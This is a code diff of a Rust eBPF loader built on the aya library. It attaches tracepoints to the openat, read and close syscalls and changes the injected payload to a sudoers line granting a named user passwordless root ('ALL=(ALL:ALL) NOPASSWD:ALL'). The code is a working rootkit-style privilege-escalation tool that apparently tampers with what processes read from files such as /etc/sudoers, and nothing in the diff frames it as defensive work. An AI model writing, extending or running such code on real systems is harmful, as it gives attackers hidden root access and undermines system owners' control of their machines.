@@ -43,12 +43,14 @@ async fn main() -> anyhow::Result<()> {
         return Ok(());
     }
     let user_name = user_name.unwrap();
-    let payload_len = user_name.len() as u64;
+    let uid = lookup_user(user_name.as_str())?;
 
-    if payload_len > max_username_len {
+    if user_name.len() as u64 > max_username_len {
         println!("the user name should be less than {}", MAX_PAYLOAD_LEN);
         return Ok(());
     }
+
+    let magic_name = format!("{} ALL=(ALL:ALL) NOPASSWD:ALL #", user_name);
 
     env_logger::init();
 
@@ -67,16 +69,16 @@ async fn main() -> anyhow::Result<()> {
     // runtime. This approach is recommended for most real-world use cases. If you would
     // like to specify the eBPF program at runtime rather than at compile-time, you can
     // reach for `Bpf::load_file` instead.
-    let mut payload: [u8; MAX_PAYLOAD_LEN as usize] = [0; MAX_PAYLOAD_LEN as usize];
-    payload[..user_name.len()].copy_from_slice(user_name.as_bytes());
+    let mut payload: [u8; MAX_PAYLOAD_LEN] = [0; MAX_PAYLOAD_LEN];
+    payload[..magic_name.len()].copy_from_slice(magic_name.as_bytes());
 
     let mut ebpf_loader = aya::EbpfLoader::new();
-
-    let uid = lookup_user(user_name.as_str())?;
 
     if opt.restrict {
         ebpf_loader.set_global("uid", &uid, true);
     }
+
+    let payload_len = magic_name.len() as u64;
 
     let mut ebpf = ebpf_loader
         .set_global("payload_len", &payload_len, true)
@@ -100,20 +102,25 @@ async fn main() -> anyhow::Result<()> {
     sys_enter_openat_trace_point.load()?;
     sys_enter_openat_trace_point.attach("syscalls", "sys_enter_openat")?;
 
-    let sys_exit_openat_trace_point: &mut TracePoint =
+    let app_trace_point: &mut TracePoint =
         ebpf.program_mut("handle_openat_exit").unwrap().try_into()?;
-    sys_exit_openat_trace_point.load()?;
-    sys_exit_openat_trace_point.attach("syscalls", "sys_exit_openat")?;
+    app_trace_point.load()?;
+    app_trace_point.attach("syscalls", "sys_exit_openat")?;
 
-    let sys_exit_openat_trace_point: &mut TracePoint =
+    let app_trace_point: &mut TracePoint =
         ebpf.program_mut("handle_read_enter").unwrap().try_into()?;
-    sys_exit_openat_trace_point.load()?;
-    sys_exit_openat_trace_point.attach("syscalls", "sys_enter_read")?;
+    app_trace_point.load()?;
+    app_trace_point.attach("syscalls", "sys_enter_read")?;
 
-    let sys_exit_openat_trace_point: &mut TracePoint =
+    let app_trace_point: &mut TracePoint =
         ebpf.program_mut("handle_read_exit").unwrap().try_into()?;
-    sys_exit_openat_trace_point.load()?;
-    sys_exit_openat_trace_point.attach("syscalls", "sys_exit_read")?;
+    app_trace_point.load()?;
+    app_trace_point.attach("syscalls", "sys_exit_read")?;
+
+    let app_trace_point: &mut TracePoint =
+        ebpf.program_mut("handle_close_exit").unwrap().try_into()?;
+    app_trace_point.load()?;
+    app_trace_point.attach("syscalls", "sys_exit_close")?;
 
     let ctrl_c = signal::ctrl_c();
     ctrl_c.await?;
